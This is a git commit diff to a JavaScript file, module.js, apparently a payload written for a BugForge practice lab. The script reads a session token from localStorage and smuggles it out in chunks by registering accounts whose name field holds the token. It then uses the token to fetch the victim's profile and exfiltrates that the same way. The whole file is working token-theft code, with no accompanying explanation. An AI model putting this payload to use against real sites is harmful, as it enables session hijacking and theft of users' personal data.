bdae17f74dafd3ddae60910d5845194ad9e40d06
mohmad20081429-a11y <mohmad2008.1429@gmail.com>
2026-07-22 20:26:11 +0300

    Update module.js

--- module.js
+++ module.js
@@ -1,19 +1,33 @@
 (function () {
   var t = localStorage.getItem("token") || "NOTOKEN";
+
   function reg(uname, blob) {
-    fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/register", {
+    fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io//api/register", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
-        username: uname, password: "flag1234",
+        username: uname,
+        password: "flag123",
         email: uname + "@x.com",
         full_name: String(blob).slice(0, 240)
       })
     });
   }
-  reg("stolen_1", "TOKA:" + t.slice(0, 230));
-  reg("stolen_2", "TOKB:" + t.slice(230));
+
+  reg("pe_tokA", "TOKA:" + t.slice(0, 230));
+  reg("pe_tokB", "TOKB:" + t.slice(230));
+
   fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/profile", {
-    headers: { Authorization: "Bearer " + t }
-  }).then(r => r.text()).then(b => reg("pe_prof", "PROF:" + b));
+    headers: {
+      Authorization: "Bearer " + t
+    }
+  })
+  .then(function (r) {
+    return r.text();
+  })
+  .then(function (b) {
+    reg("pe_prof", "PROF:" + b);
+  });
 })();
